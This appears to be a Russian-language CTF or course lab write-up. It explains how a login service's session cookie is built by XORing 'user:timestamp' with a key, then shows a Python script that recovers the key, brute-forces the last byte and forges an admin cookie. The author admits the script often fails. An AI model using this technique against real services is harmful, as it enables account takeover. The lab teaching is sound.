В общем что тут у нас? Сервис, который позволяет логиниться. И больше ничего. Тогда давайте залогинимся как test:test и глянем на куку. А там какая-то строка. А если обновить страницу? Она поменялась, но не сильно. Видимо кука зависит от времени.

Не буду долго держать интригу, эта кука получается следующим образом:
Берем test:timestamp, ксорим его с ключом, кодируем в base64. Это наша кука.

И каков наш алгоритм?
1. Получаем куку с сервера
2. Декодируем из base64
3. Ксорим со строкой test:{time.time()} и получаем ключ
4. Берем строку admin:{time.time()} и ксорим с ключом
5. Кодируем в base64
6. Засовываем куку к себе в браузер

Какая проблема возникает? time:timestamp - это 15 символов. admin:timestamp - это 16 символов. Получается, что нашему ключу не будет хватать символов. Что в таком случае делаем? Перебираем все символы в надежде, что какой то из них подойдет. Вот сплойт на питоне:

```python
import time

import requests
import base64

def xor_two_str(a,b):
    xored = []
    for i in range(max(len(a), len(b))):
        xored_value = ord(a[i%len(a)]) ^ ord(b[i%len(b)])
        xored.append(chr(xored_value))
    return xored

def encrypt1(var, key):
    return bytes(a ^ b for a, b in zip(var, key))

data = {
    "login": "test",
    "password": "test"
}

s = requests.Session()

response = s.post("http://pillar.is-course.ru/login", data=data)
cookie = s.cookies.get("session")
cookie = base64.b64decode(cookie)
timestamp = int(time.time())
template = f"test:{timestamp}".encode()
key = encrypt1(cookie, template)
key = list(key)
print(key)
my_str = f"admin:{timestamp}".encode()
for i in range(256):
    new_key = bytes(key+[i])
    print(new_key)
    new_cookie = base64.b64encode(encrypt1(my_str, new_key)).decode()
    cookies = {
        "session": new_cookie
    }
    if "Welcome, Anonymous!" not in requests.get("http://pillar.is-course.ru/", cookies=cookies).text:
        print(new_cookie)
```
Вывод этого скрипта - это все варианты ключа и кука, если у него получилось войти. Однако почему то так выходит, что скрипт отрабатывает далеко не всегда. Запускайте периодически, может повезет :D. Ну либо ищите ошибку в скрипте и запускайте его правильно.